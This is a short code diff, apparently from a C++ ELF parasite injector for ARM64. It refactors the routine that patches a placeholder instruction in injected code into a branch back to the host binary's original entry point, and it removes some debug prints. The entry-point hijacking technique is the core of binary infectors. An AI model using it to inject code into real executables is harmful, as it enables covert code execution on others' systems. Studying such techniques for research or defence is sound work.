@@ -17,30 +17,29 @@ bool patch_parasite_and_relinquish_control(
   // imm26 = rel / 4
   // The rel is offset from the current instruction (b xxx)
   // The patched jump instruction is always 4 bytes.
-  auto cur = common::find<uint32_t>(mapping.base() + parasite_offset,
-                                    parasite_size, no_op_to_be_patched);
-  if (cur == -1) {
+  auto patch_offset_from_parasite_start = common::find<uint32_t>(
+      mapping.base() + parasite_offset, parasite_size, no_op_to_be_patched);
+  if (patch_offset_from_parasite_start == -1) {
     // printf("failed to patch host entry\n");
     return false;
   }
   int32_t rel = 0;
   if (binary_type == ET_EXEC) {
-    printf("original entry: %x\n", original_entry_point);
-    printf("parasite entry: %x\n", parasite_load_address);
     // for executables, the original entry is the load address, the parasite
     // load address is the new memory address. Use that for offset calculation.
-    rel = original_entry_point - (parasite_load_address + cur);
-    printf("relative to cur patch addr: %x\n", rel);
+    rel = original_entry_point -
+          (parasite_load_address + patch_offset_from_parasite_start);
   } else if (binary_type == ET_DYN) {
     // Both original and parasite offset are relative address to the process
     // start, which is not known until runtime.
-    rel = original_entry_point - (parasite_offset + cur);
+    rel = original_entry_point - (parasite_offset + patch_offset_from_parasite_start);
   } else {
     CHECK_FAIL();
   }
 
   rel /= 4;
-  auto* inst = (int32_t*)(mapping.mutable_base() + parasite_offset + cur);
+  auto* inst = (int32_t*)(mapping.mutable_base() + parasite_offset +
+                          patch_offset_from_parasite_start);
 
   *inst = rel;
   // fill in op-code
@@ -48,7 +47,6 @@ bool patch_parasite_and_relinquish_control(
 
   *inst &= 0b11111111111111111111111111;
   *inst |= (op_code);
-  printf("patched inst to: %x\n", *inst);
 
   return true;
 }
